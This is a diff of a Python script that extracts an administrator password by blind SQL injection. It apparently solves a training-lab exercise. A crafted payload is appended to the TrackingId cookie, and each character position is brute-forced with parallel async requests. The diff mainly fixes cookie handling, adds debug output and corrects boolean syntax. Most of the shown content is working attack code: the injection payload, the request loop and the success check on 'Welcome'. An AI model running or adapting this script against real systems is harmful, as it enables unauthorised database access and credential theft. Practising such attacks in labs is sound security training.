@@ -5,6 +5,7 @@ import urllib
 import asyncio
 import aiohttp
 import json 
+import copy
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -19,13 +20,17 @@ password_extracted = {}
 Get the character for a single position.
 Character is saved in the global variable "password_extracted".
 """
-async def getChar(position, url, session, cookies):
+async def getChar(position, url, session, cookies_in):
     for j in range(32, 126):
-        #sys.stdout.write("Trying char %s at pos %s\n" % (chr(j), position))
+        cookies = copy.deepcopy(cookies_in)
+        sys.stdout.write("Trying char %s at pos %s\n" % (chr(j), position))
         #sys.stdout.write("password_extracted: %s" % password_extracted)
-        #sys.stdout.flush()
+        sys.stdout.flush()
         sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (position, j)
         sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+        cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload_encoded
+        #sys.stdout.write("cookie payload: %s, \nencoded cookie: %s\n" % (sqli_payload, cookies["TrackingId"]))
+        sys.stdout.flush()
         async with session.get(url, cookies=cookies, ssl=False) as r:
             text = await r.text()
             if "Welcome" in text:
@@ -65,7 +70,8 @@ def sqli_password(url):
                 "TrackingId": "yFRfxYc2JYHZ0K8v" + sqli_payload_encoded,
                 "session": "QEw4PHGMxLHZUCIJPVQILnpzxeWvmxLp"
             }
-            #sys.stdout.write("cookie payload: %s, encoded cookie: %s" % (sqli_payload, cookies["TrackingId"]))
+            sys.stdout.write("cookie payload: %s, \nencoded cookie: %s\n" % (sqli_payload, cookies["TrackingId"]))
+            sys.stdout.flush()
             r = requests.get(url, cookies=cookies, verify=False)
             if "Welcome" not in r.text:
                 sys.stdout.write("\r" + password_extracted + chr(j))
@@ -94,7 +100,7 @@ def main():
         config = json.load(f)
         print(config)
 
-    if(!("url" in config) || !("TrackingId" in config) || !("session" in config) || !("http_proxy" in config) || !("https_proxy" in config)):
+    if(not("url" in config) or not("TrackingId" in config) or not("session" in config) or not("http_proxy" in config) or not("https_proxy" in config)):
         sys.stdout.write("(+) Use the config.json file to configure the script.\n")
         sys.stdout.write("(+) For syntax, see the github repo.\n")
         sys.stdout.flush()
@@ -109,7 +115,9 @@ def main():
         "http": config["http_proxy"],
         "https": config["https_proxy"]
     }
-    print("(+) Retrieving administrator password...")
+    sys.stdout.write("(+) Settings: \nURL: %s\nCookies: %s\nProxies: %s\n" % (url, cookies, proxies))
+    sys.stdout.write("(+) Retrieving administrator password...\n")
+    sys.stdout.flush()
     asyncio.run(runParallel(url, cookies))
 
 if __name__ == "__main__":
